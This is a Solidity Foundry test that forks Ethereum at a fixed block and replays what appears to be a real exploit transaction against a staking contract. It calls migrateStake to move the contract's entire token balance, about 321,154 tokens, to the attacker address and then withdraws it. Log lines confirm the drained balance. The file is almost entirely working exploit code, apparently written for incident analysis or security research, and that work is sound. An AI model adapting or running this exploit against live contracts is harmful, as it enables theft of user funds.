// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

// https://explorer.phalcon.xyz/tx/eth/0x8c3f442fc6d640a6ff3ea0b12be64f1d4609ea94edd2966f42c01cd9bdcf04b5
// https://etherscan.io/address/0x9c9Fb3100A2a521985F0c47DE3B4598dafD25B01

interface I {
    function balanceOf(address) external payable returns (uint256);
    function withdrawAll(bool) external payable;
    function migrateStake(address, uint256) external payable;
}

contract X2df9 is Test {
    address immutable r = address(this);
    receive() external payable {}

    function setUp() public pure {
        console2.log("0x8c3f442fc6d640a6ff3ea0b12be64f1d4609ea94edd2966f42c01cd9bdcf04b5");
    }

    address constant x636f = 0x000000000000000000636F6e736F6c652e6c6f67;
    address constant x9bdb = 0x9bdb04493aF17eB318A23BfeFe43f07b3E58EcFb;
    address constant xbcb8 = 0xBcB8b7FC9197fEDa75C101fA69d3211b5a30dCD9;
    address constant xd286 = 0xd2869042E12a3506100af1D192b5b04D65137941;

    function test() public {
        vm.createSelectFork("http://localhost:18545", 15725066); // tx.blockNumber - 1
        // vm.createSelectFork("http://localhost:18545", bytes32(0x8c3f442fc6d640a6ff3ea0b12be64f1d4609ea94edd2966f42c01cd9bdcf04b5));

        // https://explorer.phalcon.xyz/tx/eth/0x8c3f442fc6d640a6ff3ea0b12be64f1d4609ea94edd2966f42c01cd9bdcf04b5
        x233805fb();
    }

    function test3() public {
        vm.createSelectFork("http://localhost:18545", 15725066); // tx.blockNumber - 1

        address RECEIVER = address(this);
        vm.warp(1665493715);
        vm.roll(15725067);
        // https://explorer.phalcon.xyz/tx/eth/0x8c3f442fc6d640a6ff3ea0b12be64f1d4609ea94edd2966f42c01cd9bdcf04b5
        vm.deal(RECEIVER, 10 ether);
        vm.store(
            address(0xBcB8b7FC9197fEDa75C101fA69d3211b5a30dCD9),
            keccak256(abi.encode(RECEIVER, uint256(1))),
            bytes32(uint256(1000000000000000000000000))
        );
        x233805fb();
    }

    function x233805fb() public {
        // uint256 v1 = 321154865567124596801893;
        uint256 v1 = I(xbcb8).balanceOf(xd286);
        console2.log("I(xbcb8).balanceOf(xd286)\t->", "321154865567124596801893 (321154.8655 ether)");
        I(xd286).migrateStake(x9bdb, v1);
        I(xd286).withdrawAll(false);
        // uint256 v2 = 321154865567124596801893;
        uint256 v2 = I(xbcb8).balanceOf(r);
        console2.log("I(xbcb8).balanceOf(r)\t\t->", "321154865567124596801893 (321154.8655 ether)");
    }

    fallback() external payable {
        revert("no such function");
    }
}
